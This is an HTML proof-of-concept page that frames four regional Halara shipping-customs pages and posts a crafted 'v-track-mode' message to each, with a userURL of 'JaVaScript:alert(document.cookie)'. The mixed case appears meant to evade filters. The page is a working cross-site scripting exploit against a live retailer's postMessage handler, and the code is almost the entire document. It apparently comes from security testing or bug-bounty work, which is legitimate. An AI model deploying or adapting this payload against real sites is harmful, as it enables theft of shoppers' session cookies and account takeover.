<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Iframe PostMessage Halara - Multiple Iframes</title>
    <style>
        iframe {
            width: 600px;
            height: 400px;
            border: 1px solid #ccc;
            margin: 10px;
        }
        .iframe-container {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
        }
    </style>
</head>
<body>
    <h2>Parent Page - Multiple Iframes</h2>
    <div class="iframe-container">
        <iframe id="iframe1" src="https://eur.halara.com/pages/shipping-customs?sa-visual-mode=true" name="iframe1"></iframe>
        <iframe id="iframe2" src="https://www.halara.com/pages/shipping-customs?sa-visual-mode=true&switchSite=EU_To_M&_switch_domain=US_USD_en&locale=en" name="iframe2"></iframe>
        <iframe id="iframe3" src="https://thehalara.au/pages/shipping-customs?sa-visual-mode=true&switchSite=M_To_AU&_switch_domain=AU_AUD_au&locale=au" name="iframe3"></iframe>
        <iframe id="iframe4" src="https://thehalara.co.uk/pages/shipping-customs?sa-visual-mode=true&switchSite=AU_To_UK&_switch_domain=GB_GBP_uk&locale=uk" name="iframe4"></iframe>
    </div>

    <script>
        window.addEventListener('load', function() {
            const iframes = [
                document.getElementById('iframe1'),
                document.getElementById('iframe2'),
                document.getElementById('iframe3'),
                document.getElementById('iframe4')
            ];

            // Send postMessage to each iframe one by one with delays
            iframes.forEach((iframe, index) => {
                setTimeout(() => {
                    iframe.contentWindow.postMessage({
                        source: "sa-fe",
                        type: "v-track-mode",
                        data: {
                            isVtrack: true,
                            userURL: "JaVaScript:alert(document.cookie)"
                        }
                    }, "*");
                }, 1500 + (index * 1000)); 
            });
        });
    </script>
</body>
</html>